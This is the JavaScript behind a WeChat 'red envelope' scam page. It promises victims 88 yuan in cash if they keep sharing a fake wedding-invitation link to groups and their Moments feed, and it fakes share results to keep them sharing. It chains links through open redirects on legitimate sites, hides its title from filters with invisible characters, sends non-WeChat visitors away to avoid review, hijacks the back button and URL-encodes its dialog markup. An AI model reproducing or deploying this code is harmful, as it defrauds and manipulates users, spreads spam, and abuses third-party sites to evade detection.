var num = getUrlParam("__money") ? num : 88;
var alertTimes = 0;
var appShareCount = 0;
var timelineShareCount = 0;
var appSuccessCount = 0;
var timelineSuccessCount = 0;

var jumpUrls = ['http://dolphin.yoka.com/c?z=yoka&u=', 'https://www.zzidc.com/tomember?url=', 'http://manhua.weibo.cn/comic/comic/redirect?url=', 'https://account.36kr.com/api/v1/oauth/sign-out?client_id=6&ok_url=', 'http://rtb.behe.com/ck?landing=', 'http://mai.mama.cn/wap/member/loginCallBack?redirectUrl=', 'http://v10.sznews.com/c?z=sznews&u=', 'http://m.hao123.com/j.php?php=1&action=headline&url=', 'http://3g.hao123.com/j.php?php=1&action=headline&url=']


var tips = {
    appSuccess: function(count) {
        return `<b style="font-size: 22px;color: LimeGreen">分享成功  <img style="width: 20px;vertical-align:middle" src="https://cdn.jsdelivr.net/gh/powerXIXI/envelope/assets/dui.png"></b><br/><br/>您仅需再分享到<b style="font-size: 18px;color: red">${count || 1}个不同的群</b><br/><b style="font-size: 20px;color: red;">${num}元现金</b><br/>将自动存入您的微信钱包`
    },
    appFail: function() {
        return `<b style="font-size: 22px;color: red">分享失败  <img style="width: 20px;vertical-align:middle" src="https://cdn.jsdelivr.net/gh/powerXIXI/envelope/assets/cuo.png"></b><br>注意：请不要分享到<b style="color: red">相同的群或好友</b><br>请尝试重新分享到<b style="color: red">不同的群</b><br/>即可马上领取<b style="font-size: 18px;color: red;">${num}</b>元现金`
    },
    timelineFail: function(count) {
        return `<b style="font-size: 22px;color: red">分享失败  <img style="width: 20px;vertical-align:middle" src="https://cdn.jsdelivr.net/gh/powerXIXI/envelope/assets/cuo.png"></b><br><br>注意：必须<b style="color: red">公开</b>分享才可以领取<br><b style="color: #ffaa00">客服需要验证朋友圈分享信息发放红包！</b><br>请尝试重新分享到<b style="font-size: 18px;color: #f5294c">朋友圈</b><br>保证<b style="color: red">100%</b>可以领取<b style="font-size: 18px;color: red;">${num}</b>元现金`
    },
    timelineSuccess: function(count) {
        return `<b style="font-size: 22px;color: LimeGreen">分享成功  <img style="width: 20px;vertical-align:middle" src="https://cdn.jsdelivr.net/gh/powerXIXI/envelope/assets/dui.png"></b><br/><br/>仅需再分享到<b style="font-size: 18px;color: red">${count}次朋友圈</b><br/><b style="font-size: 20px;color: red;">${num}元现金</b><br/>将自动存入您的微信钱包`
    },
    done: function() {
        return '<b>感谢您的参与 :-)</b><br/><b style="font-size: 18px;color: red;">注意：系统将会验证朋友圈信息判断是否完成分享任务！</b><br/><br/><b>由于活动量巨大<br/>红包最迟24小时内到账<br/>请保留朋友圈信息至红包到账<br/>请注意查看您的微信钱包<br/></b><b style="color: red;">删除分享链接可能导致无法到账</b>'
    }
}

var flow = {
    app:[{
        title:'婚͏͏͏͏͏͏͏͏͏͏礼邀͏͏请͏͏͏函派͏͏͏͏钱啦！！',
        desc:'喜钱人人有礼',
        imgUrl:'http://img04.sogoucdn.com/app/a/100520146/5E76B1521EFF6DE3F957D4547CE1DD6B',
        type:'app',
        tip:'success',
        link:jumpUrls[rnd(0,jumpUrls.length)] + encodeURIComponent('http://www.baidu.com')
    },{
        title:'婚͏͏͏͏͏͏͏͏͏͏礼邀͏͏请͏͏͏函派͏͏͏͏钱啦！！',
        desc:'喜钱人人有礼',
        imgUrl:'http://img04.sogoucdn.com/app/a/100520146/5E76B1521EFF6DE3F957D4547CE1DD6B',
        type:'app',
        tip:'fail',
        link:jumpUrls[rnd(0,jumpUrls.length)] + encodeURIComponent('http://www.baidu.com')
    },{
        title:'婚͏͏͏͏͏͏͏͏͏͏礼邀͏͏请͏͏͏函派͏͏͏͏钱啦！！',
        desc:'喜钱人人有礼',
        imgUrl:'http://img04.sogoucdn.com/app/a/100520146/5E76B1521EFF6DE3F957D4547CE1DD6B',
        type:'app',
        tip:'success',
        link:jumpUrls[rnd(0,jumpUrls.length)] + encodeURIComponent('http://www.baidu.com')
    }],
    timeline:[{
        title:'婚͏͏͏͏͏͏͏͏͏͏礼邀͏͏请͏͏͏函派͏͏͏͏钱啦！！',
        desc:'喜钱人人有礼',
        type:'timeline',
        tip:'fail',
        link:jumpUrls[rnd(0,jumpUrls.length)] + encodeURIComponent('http://www.baidu.com')
    },{
        title:'婚͏͏͏͏͏͏͏͏͏͏礼邀͏͏请͏͏͏函派͏͏͏͏钱啦！！',
        desc:'喜钱人人有礼',
        type:'timeline',
        tip:'success',
        link:jumpUrls[rnd(0,jumpUrls.length)] + encodeURIComponent('http://www.baidu.com')
    }]
}

var appLength = flow['app'].length;
var timelineLength = flow['timeline'].length;
var appTotalSuccessCount = appLength - flow['app'].filter(function(d){return d.tip === 'success'}).length;
var timelineTotalSuccessCount = timelineLength - flow['timeline'].filter(function(d){return d.tip === 'success'}).length;

function getUrlParam(a) {
    var d, b = new RegExp("(^|&)" + a + "=([^&]*)(&|$)"),
        c = window.location.search.substr(1).match(b);
    return null != c ? unescape(c[2]) : (d = window.location.href.split("#"), d.length > 1 && (d = d[1].match(b), null != d) ? unescape(d[2]) : null)
}

function share_start() {
    wxalert('<b style=\"font-size: 22px;color: #1BBC9B\">恭喜你<br><br></b><span style=\"color:#8c8c8c\">您获得现金红包</span></b><span style=\"color:#f5294c\"><br><span style=\"font-size: 23px;color:red\">' + num + '</span>元<br>活动宗旨：喜钱人人有礼，您只需分享到群后</span><span style=\"font-size: 23px;color:red\">即可领取</span><br><span>完成后自动存入您的微信钱包</span><br/><span>（<b style=\"color: red\">注意:群人数需>50人才能免审核立即领取</b>）</span><br><br/><span style=\"color:#8c8c8c\">红包总金额仅剩余' + rnd(3000, 4000) + '.00万元，先到先得，活动经微信认证，真实有效</span>', '分享领取');
}

function loading() {
    wxalert('<img style=\"width: 30px\" src=\"https://cdn.jsdelivr.net/gh/powerXIXI/envelope/assets/loading.gif"><br><b style=\"font-size: 20px;color: red\">正在查询红包数据...</b>');
}

function it(n) {
    var i = new RegExp("(^|&)" + n + "=([^&]*)(&|$)"),
        t = window.location.search.substr(1).match(i);
    //t = window.location.hash.substr(1).match(i);
    return t != null ? decodeURI(t[2]) : null
}


$(".red-packet").click(function() {
    // share_start();
    showTips()
});

function wxalert(msg, btn, callback) {
    if (alertTimes == 0) {
        var dialog = unescape("%3C%64%69%76%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%22%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%6D%61%73%6B%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%64%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%6D%73%67%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%66%74%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%61%20%68%72%65%66%3D%22%6A%61%76%61%73%63%72%69%70%74%3A%3B%22%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%20%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%5F%70%72%69%6D%61%72%79%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%62%74%6E%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E");
        $("body").append(dialog)
    }
    alertTimes++;
    var d = $('#lly_dialog');
    d.show(200);
    d.find("#lly_dialog_msg").html(msg);
    d.find("#lly_dialog_btn").html(btn);
    d.find("#lly_dialog_btn").off('click').on('click', function() {
        d.hide(200);
        if (callback) {
            callback()
        }
    })
}

function getParam(name) {
    return location.href.split("#")[0].match(new RegExp('[?&]' + name + '=([^?&]+)', 'i')) ? decodeURIComponent(RegExp.$1) : '';
}

function rnd(n, m) {
    var random = Math.floor(Math.random() * (m - n + 1) + n);
    return random;
}

function showTips() {
    var u = $("#lly_dialog_msg").html();
    var t = $("#lly_dialog_btn").html();
    wxalert(u, t);
}



function showtip() {
    fi();
    $(".pop_hb").hide();
    $(".pop_share").show();
    share_start();
    document.title = " ";
}

function fi() {
    var n = num;
    n && $(".hb_money span").html(n)
    $(".hb_bot span").html(0)
}

function closeAlert() {
    var d = $('#lly_dialog');
    d.hide();
}



function onAppMessage(){
    var option = flow['app'][appShareCount];
    wx.onMenuShareAppMessage({
        title: option.title,
        desc: option.desc,
        link: option.link,
        imgUrl: option.imgUrl,
        success: function() {
            switch(true){
                case appShareCount === appLength - 1:
                   if(timelineShareCount === timelineLength){
                        wxalert(tips.done(),'好的',function(){
                            WeixinJSBridge.invoke('closeWindow');
                        });
                   }else{
                        wxalert(tips.timelineSuccess(timelineTotalSuccessCount - timelineSuccessCount),'');
                   }
                break;
                case option.tip === 'success':
                    appSuccessCount++;
                    appShareCount++;
                    wxalert(tips.appSuccess(appTotalSuccessCount - appSuccessCount),'');
                break;
                case option.tip === 'fail':
                    appShareCount++;
                    wxalert(tips.appFail(),'')
                break;
            }
            onAppMessage();
        }
    });
}
function onTimeline(){
    var option = flow['timeline'][timelineShareCount];
    wx.onMenuShareTimeline({
        title: option.title,
        desc: option.desc,
        link: option.link,
        imgUrl: option.imgUrl,
        success: function() {
            switch(true){
                case timelineShareCount === timelineLength - 1:
                   if(appShareCount === appLength){
                        wxalert(tips.done(),'好的',function(){
                            WeixinJSBridge.invoke('closeWindow');
                        });
                   }else{
                        wxalert(tips.appSuccess(appTotalSuccessCount - appSuccessCount),'');
                   }
                break;
                case option.tip === 'success':
                    timelineSuccessCount++;
                    timelineShareCount++;
                    wxalert(tips.timelineSuccess(timelineTotalSuccessCount - timelineSuccessCount),'');
                break;
                case option.tip === 'fail':
                    timelineShareCount++;
                    wxalert(tips.timelineFail(),'')
                break;
            }
            onTimeline();
        }
    });
}

function wxConfig() {
    wx.config({
        debug: false,
        appId: 'i prefer xss',
        jsApiList: ['onMenuShareTimeline', 'onMenuShareAppMessage', 'hideMenuItems', 'showMenuItems']
    });
    wx.ready(function() {
        closeAlert();
        share_start();
        onAppMessage();
        onTimeline();
    })
}


function checkPlatform() {
    var useragent = navigator.userAgent;
    if (useragent.match(/MicroMessenger/i) != 'MicroMessenger' && location.href.search("debug") == -1) {
        var opened = window.open('http://sogou.com/', '_self');
        //opened.opener = null;
        //opened.close();
    }
    var system = {
        win: false,
        mac: false,
        xll: false
    };
    var p = navigator.platform;
    system.win = p.indexOf("Win") == 0;
    system.mac = p.indexOf("Mac") == 0;
    system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);
    if ((system.win || system.mac || system.xll) && location.href.search("debug") == -1) {
        //window.location.href = "http://v.qq.com/";
    } else {}
}

function jump(url) {
    var ua = navigator.userAgent.toLowerCase();
    if (ua.indexOf("micromessenger") > 0) {
        var a = document.createElement('a');
        a.href = url;
        a.rel = 'noreferrer';
        a.click();
    }
}

function tongji() {
    var _hmt = _hmt || [];
    (function() {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?a8abb3f1726fd78a55b003ba97b1e519";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
}



function backurl(type) {
    document.title = "请稍等...";
    WeixinJSBridge.invoke('closeWindow');
    /*$.get('//cy110.cn/api/ad.php',function(data){
      
                if(type == 1){
                  
                    top.location.href =data.adsUrl+"&code10=back_ad_id1"
                     
                }else{
                  
                    top.location.href =data.adsUrl+"&code10=back_ad_id1";
                  
                }  
    }, 'json');*/
}


function init() {
    checkPlatform();
    $(".realmoney").html(num);
    changeHash();
    loading();
    wxConfig();
}


function changeHash() {
    window.onhashchange = function() {
        backurl(1);
    };
    history.pushState(null, "message", "#" + new Date().getTime());
}


init()